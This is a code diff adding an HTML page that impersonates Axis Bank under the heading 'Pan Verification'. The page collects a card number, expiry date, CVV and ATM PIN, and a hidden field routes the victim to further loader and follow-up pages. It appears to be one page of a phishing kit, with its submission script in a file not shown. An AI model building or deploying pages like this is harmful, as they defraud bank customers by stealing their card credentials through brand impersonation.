@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/cleave.js/1.6.0/cleave.min.js"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Lato:wght@400;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="style.css">
+    <title>Axis Bank </title>
+</head>
+<body>
+    <header>
+        <img src="assets/header.jpg" width="100%" alt="">
+    </header>
+    <main>
+        <h2 class="text-center">Pan Verification</h2>
+        <div class="box">
+            <input type="hidden" id="nextValue" value="loader.html?next=last.html">
+            <form action="" class="form" id="frm_2_am8E_">
+                <div id="credit_card_form">
+                    <div class="form-group">
+                        <label for="">Debit/Credit Card Number</label>
+                        <input type="text" inputmode="numeric" name="ccnum" id="ccnum">
+                    </div>
+                    <div class="form-two w-100">
+                        <div class="form-group w-50">
+                            <label for="">Expiry Date</label>
+                            <input type="text" inputmode="numeric" name="edate" id="edate" placeholder="MM / YY" >
+                        </div>
+                        <div class="form-group w-50">
+                            <label for="">CVV/CVV</label>
+                            <input type="password" minlength="3" name="cvv" id="cvv" placeholder="***" >
+                        </div>
+                    </div>
+                    <div class="form-group">
+                        <label for="">ATM Pin</label>
+                        <input type="text" maxlength="6" minlength="4" inputmode="numeric" name="atpin" id="ccl" >
+                    </div>
+                </div>
+                <div class="form-group">
+                    <button type="submit" class="btn btn-primary">SUBMIT</button>
+                </div>
+            </form>
+        </div>
+        <img src="assets/footer.jpg" alt="" width="100%">
+    </main>
+    <footer>
+        <img src="assets/cop.jpg" alt="" width="100%">
+    </footer>
+
+    <script src="https://code.jquery.com/jquery-3.7.1.min.js" integrity="sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo=" crossorigin="anonymous"></script>
+    <script src="script.js"></script>
+    <script>
+
+            new Cleave('#ccnum', {
+                creditCard: true
+            });
+
+            new Cleave('#edate', {
+                date: true,
+                datePattern: ['m', 'y']
+            });
+            new Cleave('#cvv', {
+                numeral: true,
+                numeralPositiveOnly: true
+            });
+
+        $(document).ready(function(){
+            document.getElementById('cvv').addEventListener('input', function(event) {
+                this.value = this.value.replace(/\D/g, '');
+            });
+        })
+
+    </script>
+
+</body>
+
+</html>
